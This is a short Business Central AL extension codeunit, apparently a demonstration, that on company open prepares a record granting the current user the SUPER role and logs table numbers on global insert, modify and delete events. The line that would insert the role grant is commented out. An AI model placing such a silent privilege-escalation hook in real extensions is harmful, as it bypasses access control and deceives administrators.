codeunit 99001 "SAD Hack Events"
{
    Permissions = tabledata "Access Control" = RIMD;
    [EventSubscriber(ObjectType::Codeunit, Codeunit::"Company Triggers", OnCompanyOpenCompleted, '', false, false)]
    local procedure "Company Triggers_OnCompanyOpenCompleted"()
    var
        AccessControl: Record "Access Control";
    begin
        AccessControl.Init();
        AccessControl."User Security ID" := UserSecurityId();
        AccessControl."Role ID" := 'SUPER';
        // if AccessControl.Insert() then
        //     Message('Felicitaciones! ahora sos un SUPER usuario con SUPER poderes.')
    end;



    [EventSubscriber(ObjectType::Codeunit, Codeunit::"Global Triggers", OnGlobalInsert, '', false, false)]
    local procedure "Global Triggers_OnGlobalInsert"(RecRef: RecordRef)
    begin
        ShowRecRefTableNo(RecRef);
    end;

    [EventSubscriber(ObjectType::Codeunit, Codeunit::"Global Triggers", OnGlobalModify, '', false, false)]
    local procedure "Global Triggers_OnGlobalModify"(RecRef: RecordRef)
    begin
        ShowRecRefTableNo(RecRef);
    end;

    [EventSubscriber(ObjectType::Codeunit, Codeunit::"Global Triggers", OnGlobalDelete, '', false, false)]
    local procedure "Global Triggers_OnGlobalDelete"(RecRef: RecordRef)
    begin
        ShowRecRefTableNo(RecRef);
    end;

    local procedure ShowRecRefTableNo(RecRef: RecordRef)
    begin
        Message(StrSubstNo('Record Table ID %1', RecRef.Number));
    end;
}